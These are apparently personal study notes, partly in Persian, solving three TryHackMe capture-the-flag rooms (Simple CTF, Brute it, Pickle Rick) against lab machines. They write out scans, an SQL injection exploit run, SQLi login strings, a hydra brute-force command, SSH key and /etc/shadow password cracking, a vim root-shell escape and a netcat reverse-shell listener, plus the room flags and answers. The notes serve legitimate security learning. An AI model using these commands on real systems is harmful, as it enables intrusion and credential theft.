---
Episode: E77 to E79
Date: 2024-07-26
Is Finished?: true
Practice Primary: 
Practice Secondary: 
Time: 08:00
tags:
  - CyberSecurity
  - hacking
Category: Cyber Security
banner: 
Home: "[[Table of Content - Hacking & Security]]"
Pervious Episode: "[[E73 to E76- (Android Hacking)]]"
Next Episode: "[[E0 to E6 (Setup Theory & Initialize Laboratory)]]"
---
-------
## E77 to E79(End) - (Solve Some CTF's on Try Hack Me)
- [Room Description](#Room%20Description)
- [Room Instructions](#Room%20Instructions)
	- [TASK 1 - Simple CTF](#TASK%201%20-%20Simple%20CTF)
		- [TASK Steps](#TASK%20Steps)
		- [Task Scripts](#Task%20Scripts)
- [Brute it. Learn Brute Forcing THM - E78](#Brute%20it.%20Learn%20Brute%20Forcing%20THM%20-%20E78)
- [Room Description](#Room%20Description)
- [Room Instructions](#Room%20Instructions)
	- [TASK 2 - Reconnaissance](#TASK%202%20-%20Reconnaissance)
	- [TASK 3 - Getting a Shell](#TASK%203%20-%20Getting%20a%20Shell)
	- [TASK 4 - Privilege Escalation](#TASK%204%20-%20Privilege%20Escalation)
- [Pickle Rick Command Injection THM - E79](#Pickle%20Rick%20Command%20Injection%20THM%20-%20E79)
- [Room Description](#Room%20Description)
- [Room Instructions](#Room%20Instructions)
	- [TASK 1 -Pickle Rick](#TASK%201%20-Pickle%20Rick)
*****
### Simple CTF for Beginner's THM - E77
#### Room Description
- https://tryhackme.com/room/easyctf
این چالش برای تمرین Practical Pentesting بسیار عالی میباشد.
#### Room Instructions
##### TASK 1 - Simple CTF 
###### TASK Steps
0. *Pre-Requires*
	1. *Access to `Easy CTF` Room via Open VPN*
		1. Download `.ovpn` configuration
		2. Open terminal in downloaded directory and run following command to connect to Open VPN Server
		3. `sudo openvpn davoodya.ovpn`
		4. `ifconfig` Check `tun0` be existed
			1. ![[Pasted image 20240726201134.png]] 
	2. goto Room Page and `Start machine`, then Copy IP address of machine and `ping` it to check connection
		1. ![[Pasted image 20240726201256.png]]
1. *Start Enumerating target via `nmap`*
	1. Services, Version & OS Detection
		1. `sudo nmap -T5 -sS -sV -O 10.10.91.46`
			1. ![[Pasted image 20240726201429.png]]
		2. *Enumerating Results*
			1. `21/tcp` => `vsftpd 3.0.3`
			2. `2222/tcp` => `OpenSSH 7.2p2`
		3. Enumerating Image
			1. ![[Pasted image 20240726201643.png]]
	2. Vulnerability Reconnaissance 
		1. `sudo nmap -T5 -sS -sV -O 10.10.91.46 --script vuln`
			1. ![[Pasted image 20240726202149.png]]
		2. *Enumeration Results*
			1. در نتیجه اسکن میتوانیم تمام Exploit هایی که میتوانیم برای نفوذ به این سرور استفاده کنیم را مشاهده کنیم. در مقابل این آسیب پذیری ها هم لینکی دیده میشود که برای اطلعات بیشتر میتوانیم از این لینک استفاده کنیم.
				1. ![[Pasted image 20240726203935.png]]
			2. اما در این سناریو با استفاده از بدست آوردن ورژن CMS کار شده در سرور و سپس استفاده از `searchsploit` آسیب پذیری مورد نظر را پیدا میکنیم.
2. *Now Open machine ip in Browser* => http://10.10.91.46
	1. با باز کردن صفحه، Apache Default Page را مشاهده میکنیم.
	2. Check Server `robots.txt` => http://10.10.91.46/robots.txt
		1. ![[Pasted image 20240726202436.png]]
3. *Dir Busting on Target Server*
	1. *with* `ffuf` =>
		1. `ffuf -u http://10.10.91.46/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt`
			1. ![[Pasted image 20240726203016.png]]
		2. *Attack Results*
			1. Founded Directory => `simple`
				1. ![[Pasted image 20240726203103.png]]
	2. *So Open* => http://10.10.91.46/simple
		1. با رفتن به این صفحه میتوانیم مشاهده کنیم که وبسایت با استفاده از CMS ساخته شده است و ورژن استفاده شده `CMS made simple 2.2.8` است:
			1. ![[Pasted image 20240726203303.png]]
4. *Find suitable CVE and Exploit(SQL Injection)*
	1. *Find Exploit* =>
		1. `searchsploit cms made simple`
			1. ![[Pasted image 20240726203631.png]]
		2. با اجرای کامند بالا تمام آسیب پذیری هایی که برای `cms made simple` وجود دارد را میتوان مشاهده کرد که در این سناریو میخواهیم از آسیب پذیری مربوط به ورژن 2.2.8 که SQL Injection در CMS made simple است استفاده کنیم.
		3. همچنین با استفاده از کامند زیر میتوانیم نتایج را فیلتر کنیم:
		4. `searchsploit "CMS Made Simple" 2.2.8`
			1. ![[Pasted image 20240729234202.png]]
	2. *Download Exploit* =>
		1. برای دانلود اکسپلویت باید آدرس فایل Exploit مورد نظر  که در اینجا SQL Injection است را به مقدار `php/webapps/46635.py` است را کپی کنیم:
			1. ![[Pasted image 20240726204323.png]]
		2. `searchsploit -m php/webapps/46635.py`
			1. با اجرای کامند لینک دانلود URL و محل ذخیره شدن PATH آنرا نیز میتوانیم مشاهده کنیم:
				1. ![[Pasted image 20240729234436.png]]
			2. به محض اجرای کامند هم فایل اکسپلویت دانلود میشود و میتوانیم از آن استفاده کنیم.
				1. ![[Pasted image 20240729234638.png]]
	3. *Edit & Config Exploit* =>
		1. `nano 46635.py`
			1. ![[Pasted image 20240726204527.png]]
		2. با باز کردن فایل اکسپلویت میتوانیم CVE که این اکسپلویت از آن استفاده میکند را مشاهده کنیم که در اینجا `CVE-2019-9053` میباشد. 
		3. همچنین هنگام اجرای کامند `CVE-2019-9053` هم میتوانیم ورژن CVE را مشاهده کنیم.
5. *Launching SQL Injection Exploit*
	1. *Exploit Default version write on python2* =>
		1. این اسکریپت بصورت پیشفرض با python2 نوشته شده است. در نتیجه نمیتوانیم آنرا بدرستی با python 3 اجرا کنیم.
		2. `python3 ./46635` 
			1. ![[Pasted image 20240726205131.png]]
		3. `python2 ./46635.py`
	2. *Download Python3 version of Exploit* =>
		1. نسخه پایتون 3 این آسیب پذیری را در ریپوزیتوری زیر میتوانیم دانلود کنیم:
		2. https://github.com/e-renna/CVE-2019-9053/blob/master/exploit.py
			1. ![[Pasted image 20240726205321.png]]
		3. Copy all codes in page
			1. ![[Pasted image 20240726205433.png]]
		4. Create new file in terminal and Paste Exploit codes in there 
			1. `nano new.py` Paste codes in there
				1. ![[Pasted image 20240726205549.png]]
		5. Now give executable permission to `new.py`
			1. `chmod +x new.py`
				1. ![[Pasted image 20240726205655.png]]
	4. *Launching Exploit* =>
		1. `python new.py` See usage guide
			1. ![[Pasted image 20240726205753.png]]
		2. `python new.py -u http://10.10.91.46/simple --crack -w /usr/share/wordlists/john.lst`
			1. ![[Pasted image 20240726205940.png]]
	5. *Exploit Results* =>
		1. با اجرای اکسپلویت حمله Brute Force برای یافتن پسورد صفحه انجام میشود و پس از یافتن نتیجه آنرا در ترمینال میتوانیم مشاهده کنیم.
			1. ![[Pasted image 20240726210115.png]]
		2. یوزرنیم پیدا شده `mitch` و پسورد آن `secret` میباشد.
		3. همچنین چون که از دو فلگ  `w-` و `crack--` استفاده کردیم، اگر مقدار یافت شده بصورت hash شده باشد که اصولا هم همینطور است، ابزرا بصورت خودکار عملیات Hash Cracking را نیز انجام میدهد.
		4. بنابراین توانستیم با استفاده از آسیب پذیری sqli حمله Brute Force را برای یافتن یوزر و پسورد درون http://10.10.91.6/simple که میتوانیم از آن برای ورود بر بستر ssh استفاده کنیم را با موفقیت پیاده سازی کنیم.
6. *Exploit SSH Services - Get User Flag*
	1. *Logic*
		1. در ابتدای اسکن مشاهده کردیم که سرویس SSH در ماشین تارگت بر روی پورت 2222 Open است.
		2. همچنین در Dir Busting زیر دامنه جدیدی را پیدا کردیم.
		3. در مرحله بعد هم با استفاده از آسیب پذیری پیدا شده و اکسپلویت مناسب حمله Brute Force را بر روی زیر دامنه پیدا شده در ماشین تارگت پیاده سازی کردیم که در این حمله `username` و `password` تارگت را بدست آوردیم. یوزرنیم `mitch` و پسورد `secret` میباشد.
		4. حال که تمام اطلاعات مورد نیازمان را از حمله username, password, port تارگت داریم میتوانیم ارتباط را بر بستر SSH با وب سرور برقرار کنیم.
	2. *Established ssh connection*
		1. `ssh mitch@10.10.88.165 -p 2222` 
		2. Try with `secret` Password and also try with `blank` password
			1. ![[Pasted image 20240726211857.png]]
		3. Now we can run any commands in target machine via ssh connection like `ls`
			1. ![[Pasted image 20240726211956.png]]
	3. *Get User Flag*
		1. Open file in name `user.txt` over ssh connection.
		2. `cat user.txt` Copy flag value `G00d j0b, keep up!`
			1. ![[Pasted image 20240726212146.png]]
		3. Back to `/home` directory and get all users in target server.
			1. ![[Pasted image 20240726212354.png]]
7. *Post Exploit Phase - Escalation Privilege to Get Root Flag*
	0. *First List all process using privilege*
		1.  `sudo -l` => `vim` running with root
			1. ![[Pasted image 20240726212559.png]]
		2. در نتیجه میتوانیم مشاهده کنیم که VIM با دسترسی root در حال اجراست. بنابراین میتوانیم بارفتن به این برنامه دسترسی خود را به root تغییر دهیم.
	1. *Second, goto* https://gtfobins.github.io 
		1. در مرحله بعدی با رفتن به این وبسایت میتوانیم تکه کدی که با استفاده از آن میتوانیم به پروسه VIM مهاجرت کنیم و تغییر دسترسی دهیم را مشاهده کنیم.
		2. Search binary for `vim` and click on this
			1. ![[Pasted image 20240726213109.png]]
		3. Copy `First Line Bash code`
			1. ![[Pasted image 20240726213138.png]]
	2. *Third, Run Copied code on target machine(in ssh connection) to get root access*
		1. `sudo vim -c ':!/bin/sh'`
			1. ![[Pasted image 20240726213250.png]]
		2. به محض اجرا دسترسی ما به یوزر root تغییر میکند و آنرا با کامند `whoami` میتوانیم تست کنیم:
			1. ![[Pasted image 20240726213344.png]]
	3. *Finally, you can get root flag*
		1. `ls`
		2. `cat root.txt`
			1. ![[Pasted image 20240726213515.png]]
		3. *Root Flag value*: `W3ll d0n3. You made it!`
8. *TASK 1 - Q & A*
	1. Hoe many services are running under 1000 port? `2`
	2. What is running on higher port? `ssh`
	3. Whats CVE's using against the application? `CVE-2019-9053`
	4. What Kind of vulnerability is the app vuln? `sqli`
	5. Whats the password? `secret`
	6. Where can you login with the details obtained? `ssh`
	7. Whats user flag? `G00d j0b, keep up!`
	8. is there any other users in the home directory? whats user name? `sunbath`
	9. Whats can you leverage to spawn privilege shell? `vim`
	10. Whats the root flag? `W3ll d0n3. You made it!`
		1. ![[Pasted image 20240726213543.png]]
###### Task Scripts
```sh
#0. Connect to EasyCTF Playground
sudo openvpn davoodya.ovpn
ifconfig
#1. Enumerating Target Server
sudo nmap -T5 -sS -sV -O 10.10.91.46
sudo nmap -T5 -sS -sV -O 10.10.91.46 --script vuln
#3. Initialize Dir Busting
ffuf -u http://10.10.91.46/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
#4. Find suitable CVE(SQL Injection)
searchsploit cms made simple
searchsploit cms made simple 2.2.8
searchsploit -m php/webapps/46635.py
nano 46635.py #Copy CVE Code => CVE-2019-9053

#5.Launching SQL Injection Exploit
"first copy all codes of CVE-2019-9053 python3 version from" ==> https://github.com/e-renna/CVE-2019-9053/blob/master/exploit.py
---
chmod +x new.py
nano new.py #Paste codes in here
python new.py #Test Script - usage guide
python new.py -u http://10.10.91.46/simple --crack -w /usr/share/wordlists/rockyou.txt #Start Attack

#6. Exploit SSH Services
ssh mitch@10.10.88.165 -p 2222
"Try with `secret` Password and also try with `blank` password"
ssh> ls
ssh> cat user.txt #Copy User Flag value 
"User Flag is:" G00d j0b, keep up!
cd /home/ ; ls #Copy Usernames on machine

#7. Post Exploit Phase - Escalation Privilege to Get Root Flag
sudo -l #vim use root access
sudo vim -c ':!/bin/sh' #switch to root with vim command
$> ls
$> cat root.txt #Copy Root Flag value 
"Root Flag is:" W3ll d0n3. You made it!
```
### Brute it. Learn Brute Forcing THM - E78
#### Room Description
- https://tryhackme.com/room/bruteit
	- ![[Pasted image 20240727194733.png]]
در ابن جلسه میخواهیم چالش Room بنام Brute it را حل کنیم. در این چالش حملات Brute Force را در مدل های متفاوت باید پیاده سازی کنیم تا بدین وسیله بتوانیم Task Room را Completed کنیم.
#### Room Instructions
##### TASK 2 - Reconnaissance
0. *Pre-Requires*
	1. Start machine and then Connect to Brute it play ground on OpenVPN
		1. ![[Pasted image 20240727194909.png]]
	2. Check `ifconfig`, After Connection Established `tun0` should be added in Interfaces list
		1. ![[Pasted image 20240727194946.png]]
	3. ping machine ip to check connection
		1. ![[Pasted image 20240727195137.png]]
1. *Enumerating Target*
	1. `sudo nmap -T5 -sS -sV -O -Pn 10.10.220.243`
		1. بدلیل اینکه تارگت در برابر اسکن Harden شده است در نتیجه در این اسکن با سرعت بالا نمیتوانیم اطلاعات مفیدی را استخراج کنیم و برای اینکار باید سرعت اسکن را کم کنیم:
			1. ![[Pasted image 20240727195741.png]]
		2. در واقع در این اسکن فقط و فقط پورت SSH 22 باز است.
	2. `sudo nmap -T3 -sS -sV -O -Pn 10.10.220.243`
		1. هنگامیکه اسکن را با سرعت کمتری انجام میدهیم مشاهده میشود که علاوه بر` SSH 22` که `OpenSSH 7.6p1` بر روی آن کار میکند، پورت `80 HTTP` هم باز است که بر روی آن `Apache httpd 2.4.29` خدمات دهی میکند.
	3. بنابراین پیشنهاد میشود اگر اسکن را با سرعت بالا انجام دادیم و اطلاعات بصورت کامل مشاهده نشد بار دیگر اسکن را با سرعت کمتری انجام دهیم و تکرار کنیم.
2. *Initialize Dir Busting to find Directories on Web Server*
	1. `ffuf -u http://10.10.220.243/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt`
		1. ![[Pasted image 20240727201043.png]]
	2. *Attack Result*
		1. Directory Find => `admin`
			1. ![[Pasted image 20240727201211.png]]
		2. http://10.10.220.243 => Apache default page
			1. ![[Pasted image 20240727201250.png]]
		3. http://10.10.220.243/admin => Open Admin Login Panel
			1. ![[Pasted image 20240727201333.png]]
	3. در این حمله دایرکتوری(صفحه) مورد نظر را که باید حمله Brute Force را بر روی آن پیاده سازی کنیم با آدرس http://10.10.220.243/admin  یافتیم.
3. *Checking Target Page* http://10.10.220.243/admin 
	1. حال باید صفحه یافت شده را از هر نظر بررسی کنیم که روشی را برای نفوذ به آن پیدا کنیم.
	2. Check page source code using `View Page Source`
		1. در کد های صفحه یک کامنت وجود دارد که در آن میتوانیم مشاهده کنیم یوزرنیم این صفحه `admin` است. در نتیجه حمله Brute Force را برای یافتن پسورد یوزر `admin` باید انجام دهیم:
			1. ![[Pasted image 20240727201848.png]]
		2. همچنین یوزر نیم دیگری بنام `john` پیدا کردیم که ممکن است در آینده مثلا برای برقراری SSH بکار بیاید.
	3. Try and Guess Default and Common Passwords for `admin` user.
		1. در قدم دوم هم باید پسورد هایی را که احتمال میدهیم را برای یوزر admin امتحان کنیم. پسورد هایی مانند >>
		2. `admin, password, root, 123456,` Upper & Lower case
	4. Initialize Common `sqli` in admin & password fields
		1. در قدم سوم نیز حملات شایع `sqli` را بر روی این دو فیلد انجام میدهیم تا ببنیم در برابر این نوع از حملات آسیب پذیر است و یا خیر.
		2. `admin' OR 1=1 -- -`
			1. ![[Pasted image 20240727203735.png]]
		3. `' OR 1=1 #`
	5. پس از امتحان حملات رایج و معمول در صورتیکه هنوز پسورد یافت نشده باشد باید به مرحله پیاده سازی حمله Brute Force برویم که در TASK 3 میباشد برویم.
4. *TASK 2 Q & A*
	1. How many port open? `2`
	2. What version of ssh running on target machine? `OpenSSH 7.6p1`
	3. What version of Apache running on target machine? `2.4.29` 
	4. Whats Linux Distribution is running? `Ubuntu`
	5. What is hidden directory? `/admin`
```sh
sudo nmap -T3 -sS -sV -O -Pn 10.10.220.243
ffuf -u http://10.10.220.243/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```
##### TASK 3 - Getting a Shell
0. *Information needed for Attack*
	1. *HTTP Request Parameters*
		1. http://10.10.220.243/admin => `Inspect => Network tab =>`
		2. Login with `admin, admin` and you see request/response in Network tab
			1. ![[Pasted image 20240727204420.png]]
		3. Select `/admin/` request and goto `request tab` you see HTTP Parameters we need
			1. ![[Pasted image 20240727204541.png]]
		4. این دو پارامتر را باید در قسمت فرمت بندی URL پس از وارد کردن صفحه مربوط `:/admin/` وارد کنیم. همچنین این دو پارامتر باید در میان `^^` قرار گیرد تا حمله Brute Force بر روی این دو پارامتر  انجام شود. در زیر میتوانید نمونه ای از این فرمت بندی را مشاهده کنید >>
			1. `"/admin/:user=^USER^&pass=^PASS^:F=username or password is invalid"`
			2. `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.220.243 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=username or password is invalid" -V -I -t 4`
	2. *Login Failure Messages*
		1. Login with Wrong Credential => Copy Login failure message
1. *Initialize Brute Force attack using `Hydra` - Get Flag*
	1. `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.220.243 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=username or password is invalid" -V -I -t 4`
		1. `-V` Verbose mode
		2. `-I` Ignore any error duration of attack
		3. `-t 4`  Specify CPU threads using in attack
		4. *Image*
			1. ![[Pasted image 20240727205454.png]]
	2. *Attack Results*
		1. Password find for `admin` => `xavier`
			1. ![[Pasted image 20240727205605.png]]
		2. Login with `admin, xavier` in http://10.10.220.243/admin 
		3. در این صفحه میتوانیم `RSA Private Key` را دانلود کنیم و همچنین فلگ مرحله را هم در صفحه میتوانیم مشاهده کنیم:
			1. ![[Pasted image 20240727205753.png]]
	3. در این حمله هم توانستیم کلید `RSA Private Key` و همچنین فلگ مرحله را بدست بیاوریم.
2. *Cracking RSA Private Key using `john`*
	1. *Pre-Pare RSA Private Key* =>
		1. Open RSA Private Key in Browser http://10.10.220.243/admin/panel/id_rsa , then `copy` all contents in RSA Key
			1. ![[Pasted image 20240727210245.png]]
		2. Back to Kali, Create a new txt `key.txt` file and add copied contents to this file
			1. ![[Pasted image 20240727210443.png]]
	2. *Convert ssh key to suitable hash file for john using `ssh2john`* =>
		1. `ssh2john key.txt > hash.txt`
			1. ![[Pasted image 20240727210727.png]]
	3. *Cracking `hash.txt` using `john`* =>
		1. `john hash.txt -w="/usr/share/wordlists/rockyou.txt"`
			1. ![[Pasted image 20240727211009.png]]
		2. `john --show hash.txt`
	4. با کرک کلید RSA مقدار Passphrase را بدست آوردیم که با استفاده از این Passphrase و فایل کلید RSA میتوانیم بر بستر SSH به تارگت متصل شویم >> `rockinroll`
3. *Established SSH Connection to Target*
	1. *Pre-Pare RSA Private Key file & username* =>
		1. `cp key.txt key.pem`
		2. `chmod 600 key.pm`
			1. ![[Pasted image 20240727211412.png]]
		3. دقت کنید یوزر `admin` مربوط به وب پنل بود و یوزرنیم که باید برای ارتباط SSH استفاده کنیم، یوزر `john` است که در صفحه http://10.10.220.243/admin  و همچنین در Page Source میتوانستیم مشاهده کنیم.
			1. ![[Pasted image 20240727211742.png]]
	2. *Established SSH Connection* =>
		2. `ssh -i key.pem john@10.10.170.68` 
		3. Passphrase => `rockinroll`
			1. ![[Pasted image 20240727222201.png]]
		4. Now we can run any command in web server.
	3. *Get User Flag* =>
		1. `john@bruteit~$ ls`
		2. `john@bruteit~$ cat user.txt` Copy flag value in the file
		3. Flag value => `THM{a_password_is_not_a_barrier}`
			1. ![[Pasted image 20240727222427.png]]
	4. در این مرحله هم توانستیم فلگ بعدی مرحله را درون `user.txt` در وب سرور تارگت بدست بیاوریم.
4. *TASK 3 Q & A*
	1. Whats is the user:password of admin panel? `admin:xavier`
	2. Crack `RSA Private Key`, Whats the Passphrase? `rockinroll`
	3. user.txt flag? `THM{a_password_is_not_a_barrier}`
	4. Web flag? `THM{brut3_f0rce_is_e4sy}`
		1. ![[Pasted image 20240727210105.png]]
	5. Image
		1. ![[Pasted image 20240727222533.png]]
-----
```sh
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.220.243 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=username or password is invalid" -V -I -t 4
----
nano key.txt
ssh2john key.txt > hash.txt
john hash.txt -w="/usr/share/wordlists/rockyou.txt"
john --show hash.txt
-----
cp key.txt key.pem
chmod 600 key.pm
ssh -i key.pem john@10.10.170.68
john@bruteit~$ ls
john@bruteit~$ cat user.txt
```
##### TASK 4 - Privilege Escalation
0. *Find a process using `root` Access*
	1. `sudo -l`
		1. ![[Pasted image 20240727223409.png]]
	2. تنها پروسه ای که با دسترسی *root* در حال اجراست کامند `cat` است. بنابراین در مرحله بعدی باید با رفتن به وبسایت https://gtfobins.github.io نحوه کامند `cat` که برای *Bypass* کردن به یوزر *root* مناسب است را پیدا کنیم.
1. *Find Suitable `cat` command for Escalation Privilege in* https://gtfobins.github.io
	1. Search for `cat` and click on it.
		1. ![[Pasted image 20240727223812.png]]
	2. نحوه ای از اجرای کامند cat هست که بوسیله آن مدل اگر بتوانیم محتویات فایلی را بخوانیم میتوانیم فرآیند Escalation Privilege را نیز انجام دهیم:
		1. ![[Pasted image 20240727223946.png]]
	3. البته در این مرحله نمیتوانیم از این روش استفاده کنیم و به همین خاطر به مرحله بعدی برای کرک فایل `/etc/passwd` , `/etc/shadow` میپردازیم.
2. *Cracking `/etc/passwd` and `/etc/shadow` files to get root password*
	4. *Copy Password files Contents* =>
		1. `sudo cat /etc/passwd` Copy all contents in this file
		2. `nano passwd` Paste Copied contents in this file.
			1. ![[Pasted image 20240727224147.png]]
		3. `sudo cat /etc/shadow` Copy all contents in this file
		4. `nano shadow` Paste Copied contents in this file.
	5. *Unshadow password files* =>
		1. `unshadow passwd shadow > pwd.txt`
			1. ![[Pasted image 20240727224524.png]]
	6. *Cracking Password files using `john`*
		1. `john pwd.txt -w="/usr/share/wordlists/rockyou.txt"`
			1. ![[Pasted image 20240727224955.png]]
		2. *Attack Result*: `Username:root Password:football`
			1. ![[Pasted image 20240727225042.png]]
	7. حال که پسورد یوزر root را بدست آوردیم میتوانیم به این اکانت سوئیچ کنیم.
3. *Switch to root account and get root flag*
	1. `su root` switch to root using `football` Password
		1. `ls`
		2. `cd /root ; ls`
		3. `cat root.txt` Copy flag value
			1. ![[Pasted image 20240727225540.png]]
		4. Flag value is => `THM{pr1v1l3g3_3sc4l4t410n}`
			1. ![[Pasted image 20240727225754.png]]
4. *TASK 4 Q & A*
	1. What is password of root user ? `football`
	2. What is root flag? `THM{pr1v1l3g3_3sc4l4t410n}`
		1. ![[Pasted image 20240727225808.png]]
5. Room Finished
****
```sh
john@bruteit~$ sudo -l

#-----Kali Terminal-----
sudo cat /etc/passwd 
nano passwd
sudo cat /etc/shadow
nano shadow
unshadow passwd shadow > pwd.txt
```
### Pickle Rick Command Injection THM - E79
#### Room Description
- https://tryhackme.com/room/picklerick
	- ![[Pasted image 20240728143338.png]]
این Room بر روی Exploit کردن بر روی وب سرور ها تمرکز دارد.
#### Room Instructions
##### TASK 1 -Pickle Rick
0. *Pre-Requires*
	1. Start Machine
	2. `sudo nano /etc/hosts` Add below domain & ip to this file *=>*
		1. `10.10.145.21 10-10-145-21.p.thmlabs.com`
			1. ![[Pasted image 20240728143835.png]]
	2. Now Open http://10.10.145.21 in Browser
1. *Check page and server Information*
	1. *First Step:* Check page source view-source:http://10.10.145.21 *=>*
		1. در کد های صفحه در کامنتی میتوانیم username را مشاهده کنیم: `R1ckRul3s`
			1. ![[Pasted image 20240728144320.png]]
	2. *Second Step:* Check robots.txt http://10.10.145.21/robots.txt *=>*
		1. در قدم دوم هم فایل robots.txt را بررسی میکنیم. در این فایل عبارتی با مقدار `Wubbalubbadubdub` وجود دارد که احتمال میدهیم پسورد یوزر `R1ckRul3s` باشد:
			1. ![[Pasted image 20240728144718.png]]
2. *Initialize Dir Busting*
	1. *Dir Busting to Find Directories*
		1. `ffuf -u http://10.10.145.21/FUZZ -w /usr/share/wordlists/dirb/big.txt`
		2. Attack Results *=>* Find `assets` Directory
		3. Open http://10.10.145.21/assets/ in Browser and you see list of files
			1. ![[Pasted image 20240728145320.png]]
	2. *Dir Busting to Find php, html & txt files*
		1. `ffuf -u http://10.10.145.21/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt`
		2. Attack Results *=>* Find `login.php` page
		3. Open http://10.10.145.21/login.php and you can see a Login page
		4. Login with Credential founded in Page Sources(username) and robots.txt(Password)
			1. ![[Pasted image 20240728150404.png]]
3. *Open* http://10.10.145.21/login.php *in Browser and Inject `grep`*
	1. Login with Credential founded in Page Sources(username) and robots.txt(Password)
		1. ![[Pasted image 20240728150404.png]]
	2. Now we can access `Rick Portal` and we can run any command in `Command Panel`
	3. `ls`
		1. ![[Pasted image 20240728150717.png]]
	4. `cat Sup3rS3cr3tPickl3Ingred.txt` *=>*
		1. نکته اینجاست در این `Command Panel` نمیتوانیم از `cat, more, head` استفاده کنیم و این کامند ها Lock میباشند.
		2. اما میتوانیم این فایل را بوسیله کامند `grep` باز کنیم. 
	5. `grep . Sup3rS3cr3tPickl3Ingred.txt` *=>*
		1. با این دستور میتوانیم محتویات فایل را مشاهده کنیم:
			1. ![[Pasted image 20240728151147.png]]
		2. همچنین فایل جالب دیگری هم بنام `clue.txt` وجود دارد که باید آن فایل را نیز باز و بررسی کنیم.
	6. `grep . clue.txt` *=>*
		1. ![[Pasted image 20240728151321.png]]
	7. `grep -R .` *=>*
		1. با استفاده از کامند `grep` با فلگ `R-` میتوانیم لیست فایل ها و محتویات درون فایل ها را نیز واکشی کنیم.
		2. در واقع این کامند تمام فایل های و محتویات آنها که در دایرکتوری جاری وجود دارند را واکشی میکند و نمایش میدهد. اینکار برای بررسی کلی فایل های درون وب سرور تارگت بسیار کارآمد میباشد زیرا که با یک کامند متیوانیم تمام فایل های درون وب سرور واکشی و مشاهده کنیم:
			1. ![[Pasted image 20240728151702.png]]
			2. ![[Pasted image 20240728151709.png]]
4. *Inject Python Reverse Shell*
	1. `python --version` Check Python Installed in web server
	2. *Pre-Pare Python Shell* 
		1. `ifconfig` Copy IP of `tun0` on kali machine
		2. `nc -lvnp 1234` Start Netcat Listener
		3. goto https://revshells.com, Paste `tun0 IP` and Enter `1234` for port
			1. ![[Pasted image 20240728152638.png]]
		4. Now Select `Python3 #1` or `Python3 shortest`
			1. ![[Pasted image 20240728152706.png]]
			2. ![[Pasted image 20240728152745.png]]
		5. `Copy` Python Reverse Shell Codes
			1. ![[Pasted image 20240728152833.png]]
		6. Inject `python reverse shell` to Command Panel field and `Execute` Command
			1. ![[Pasted image 20240728152911.png]]
	3. *Back to Kali Terminal*
		1. Now have reverse shell in Netcat Listener.
		2. You can run any command on web server
			1. ![[Pasted image 20240728153057.png]]
	4. *Get Second flag*
		1. الان که با Reverse Shell Python به وب سرور متصل شده ایم میتوانیم تمام کامندها را از جمله `cat` را بر روی وب سرور اجرا کنیم.
		2. `cd /home/rick`
		3. `ls -la`
		4. `cat "second ingredients"` Copy Second flag value
		5. Second Ingredients => `1 jerry tear`
	5. *Get Third flag*
		1. `sudo su -`
		2. `cd /root ; ls`
			1. ![[Pasted image 20240728153603.png]]
		3. `cat 3rd.txt` Copy third Flag 
		4. Third Ingredients => `3rd ingredients: fleeb juice`
5. *TASK 1 Q_&_A*
	1. Whats the first ingredient Rick needs? `mr. meeseek hair`
	2. Whats the second ingredient Rick needs? `1 jerry tear`
	3. Whats the final ingredient Rick needs? `3rd ingredients: fleeb juice`
6. Room Finished.
-------
```sh
# 2. Initialize Dir Busting
ffuf -u http://10.10.145.21/FUZZ -w /usr/share/wordlists/dirb/big.txt
ffuf -u http://10.10.145.21/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt
#4. Inject Python reverse shell
ifconfig  #Copy tun0 ip
nc -lvnp 1234
$: cd /home/rick
$: ls -la 
$: cat "second ingredients" #Copy Second flag value
$: cd /root ; ls -la
$: cat 3rd.txt #Copy third Flag Value
```
### !